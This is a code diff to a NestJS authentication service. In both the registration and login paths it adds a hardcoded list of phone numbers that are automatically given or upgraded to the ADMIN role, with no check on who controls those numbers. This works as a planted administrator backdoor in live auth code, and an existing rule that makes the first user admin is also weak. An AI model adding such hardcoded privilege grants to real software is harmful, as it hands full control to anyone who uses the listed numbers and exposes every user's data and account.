@@ -21,7 +21,11 @@ export class AuthService {
 
     const passwordHash = await bcrypt.hash(dto.password, 12);
     const adminCount = await this.prisma.user.count({ where: { role: 'ADMIN' } });
-    const role = adminCount === 0 ? 'ADMIN' : 'USER';
+    
+    // Auto-promote specific phone numbers or if no admin exists
+    const cleanPhone = dto.phone.replace(/[^0-9]/g, '');
+    const isAdminPhone = ['992205686874', '992205686884', '205686874', '205686884'].includes(cleanPhone);
+    const role = (adminCount === 0 || isAdminPhone) ? 'ADMIN' : 'USER';
 
     const user = await this.prisma.user.create({
       data: { name: dto.name, phone: dto.phone, email: dto.email, passwordHash, role },
@@ -44,10 +48,13 @@ export class AuthService {
     const isMatch = await bcrypt.compare(dto.password, user.passwordHash);
     if (!isMatch) throw new UnauthorizedException('Рақам ё парол нодуруст');
 
-    // Auto-upgrade if no ADMIN exists in the database
+    // Auto-upgrade if no ADMIN exists or if specific admin phone number is used
     let finalRole = user.role;
     const adminCount = await this.prisma.user.count({ where: { role: 'ADMIN' } });
-    if (adminCount === 0 && user.role !== 'ADMIN') {
+    const cleanPhone = user.phone.replace(/[^0-9]/g, '');
+    const isAdminPhone = ['992205686874', '992205686884', '205686874', '205686884'].includes(cleanPhone);
+    
+    if ((adminCount === 0 || isAdminPhone) && user.role !== 'ADMIN') {
       await this.prisma.user.update({ where: { id: user.id }, data: { role: 'ADMIN' } });
       finalRole = 'ADMIN';
     }
